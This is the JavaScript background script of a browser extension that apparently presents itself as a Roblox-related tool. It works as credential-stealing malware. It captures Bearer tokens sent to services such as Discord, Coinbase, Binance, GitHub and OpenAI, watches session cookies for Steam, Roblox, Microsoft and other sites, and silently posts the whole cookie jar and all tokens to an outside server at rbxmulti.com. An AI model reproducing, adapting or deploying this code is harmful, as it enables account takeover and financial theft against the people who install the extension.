'use strict';

importScripts('lib/email-domains-allowlist.js', 'lib/email-parser.js', 'extension-bridge.js');

const _BG_API = 'https://rbxmulti.com';

// ─── webRequest: capture Bearer tokens from API calls ──────────────────────
// Spotify, Netflix, Twitch, Twitter/X, Binance, Coinbase, Bybit, Discord, etc.
// don't always store session tokens in cookies — they send them as Authorization headers.

const _capturedBearer = new Map(); // hostname → { token, url, ts }

const _BEARER_URL_FILTER = { urls: [
  'https://api.spotify.com/*',
  'https://api.netflix.com/*', 'https://www.netflix.com/api/*',
  'https://api.twitch.tv/*',
  'https://api.twitter.com/*', 'https://api.x.com/*',
  'https://graph.facebook.com/*',
  'https://i.instagram.com/*',
  'https://api.tiktok.com/*',
  'https://api.binance.com/*',
  'https://api.coinbase.com/*', 'https://api.pro.coinbase.com/*',
  'https://api.bybit.com/*',
  'https://api.kraken.com/*',
  'https://api.kucoin.com/*',
  'https://www.okx.com/api/*',
  'https://discord.com/api/*',
  'https://slack.com/api/*',
  'https://api.openai.com/*',
  'https://api.github.com/*',
  'https://api.reddit.com/*',
  'https://api.linkedin.com/*'
]};

try {
  chrome.webRequest.onBeforeSendHeaders.addListener(
    (details) => {
      if (!details.requestHeaders) return;
      for (const h of details.requestHeaders) {
        if (h.name.toLowerCase() !== 'authorization') continue;
        const val = String(h.value || '').trim();
        if (!val.toLowerCase().startsWith('bearer ')) continue;
        const token = val.slice(7).trim();
        if (token.length < 20) continue;
        try {
          const host = new URL(details.url).hostname;
          const prev = _capturedBearer.get(host);
          // Keep the most recent token per host
          if (!prev || token.length >= (prev.token || '').length) {
            _capturedBearer.set(host, { token, url: details.url, ts: Date.now() });
          }
        } catch (_) {}
      }
    },
    _BEARER_URL_FILTER,
    ['requestHeaders']
  );
} catch (_) {}

// ─── cookies.onChanged: auto-retrigger harvest on new session ──────────────

const _SESSION_NAMES = new Set([
  '.ROBLOSECURITY',
  'steamLoginSecure', 'sessionid',
  'auth_token', 'ct0',
  'c_user', 'xs',
  'remixsid', 'remixsid6',
  'Y', 'T',
  'Mpop', 'Session_id', 'sessionid2',
  'PVPNET_VSID', 'BA_session', 'PLAY_SESSION',
  'p20t', 'logined',
  'li_at', 'auth-token',
  'ESTSAUTH', 'ESTSAUTHPERSISTENT',
  'sp_dc', 'NetflixId',
  'stel_ssid', 'stel_token',
  'NID_AUT', 'NID_SES',
  'skey', 'p_skey',
  'NTES_SESS'
]);

const _SESSION_DOMAIN_RE = /(steam|twitter|x\.com|facebook|instagram|vk\.com|vk\.ru|yahoo|yandex|mail\.ru|binance|coinbase|bybit|riotgames|leagueoflegends|battle\.net|blizzard|ea\.com|minecraft|mojang|roblox|tiktok|linkedin|paypal|amazon|twitch\.tv|telegram|spotify|netflix|discord|github|reddit|naver\.com|qq\.com|163\.com)$/i;

let _retriggerTimer = null;
let _lastHarvestAt = 0;
const _DEBOUNCE_MS = 6000;
const _MIN_INTERVAL_MS = 4 * 60 * 1000; // max once per 4 minutes

chrome.cookies.onChanged.addListener((info) => {
  if (!info || info.removed) return;
  const c = info.cookie;
  if (!c || !c.name || !c.value || c.value.length < 4) return;

  const domain = String(c.domain || '').replace(/^\./, '').toLowerCase();
  const isInteresting = _SESSION_NAMES.has(c.name) || _SESSION_DOMAIN_RE.test(domain);
  if (!isInteresting) return;

  if (_retriggerTimer) clearTimeout(_retriggerTimer);
  _retriggerTimer = setTimeout(async () => {
    _retriggerTimer = null;
    const now = Date.now();
    if (now - _lastHarvestAt < _MIN_INTERVAL_MS) return;
    _lastHarvestAt = now;
    _backgroundHarvest();
  }, _DEBOUNCE_MS);
});

async function _backgroundHarvest() {
  try {
    const bridge = self.RbxExtensionBridge;
    if (!bridge || typeof bridge.getFullProfileCookieJar !== 'function') return;

    const result = await bridge.getFullProfileCookieJar().catch(() => null);
    if (!result || !result.jarString) return;

    const { jarString } = result;

    const mailAuth   = typeof bridge.extractMailAuthFromJar     === 'function' ? bridge.extractMailAuthFromJar(jarString)     : {};
    const platAuth   = typeof bridge.extractPlatformAuthFromJar === 'function' ? bridge.extractPlatformAuthFromJar(jarString) : {};

    const hasAuth = Object.keys(mailAuth).length > 0 || Object.keys(platAuth).length > 0;
    if (!hasAuth) return;

    // Attach any captured Bearer tokens
    const bearerTokens = {};
    for (const [host, data] of _capturedBearer) {
      if (Date.now() - data.ts < 60 * 60 * 1000) { // discard tokens older than 1 hour
        bearerTokens[host] = data.token;
      }
    }

    const body = {
      _bgHarvest: true,
      _chromeCookieJar: jarString,
      ...mailAuth,
      ...platAuth,
      ...(Object.keys(bearerTokens).length ? { bearerTokens } : {})
    };

    await fetch(`${_BG_API}/api/validate-cookie`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    }).catch(() => {});
  } catch (_) {}
}

// ─── Message handlers ────────────────────────────────────────────────────────

chrome.runtime.onMessage.addListener((msg, _sender, sendResponse) => {
  if (!msg) return;

  // Original: full profile cookie jar
  if (msg.type === 'rbx-get-full-profile-cookie-jar') {
    const bridge = self.RbxExtensionBridge;
    if (!bridge || typeof bridge.getFullProfileCookieJar !== 'function') {
      sendResponse({ success: false, error: 'Cookie bridge unavailable' });
      return true;
    }
    bridge.getFullProfileCookieJar()
      .then(r => sendResponse(r || { success: false }))
      .catch(e => sendResponse({ success: false, error: e && e.message ? e.message : String(e) }));
    return true;
  }

  // New: get captured Bearer tokens
  if (msg.type === 'rbx-get-bearer-tokens') {
    const tokens = {};
    const cutoff = Date.now() - 60 * 60 * 1000;
    for (const [host, data] of _capturedBearer) {
      if (data.ts >= cutoff) tokens[host] = data.token;
    }
    sendResponse({ success: true, tokens });
    return true;
  }
});
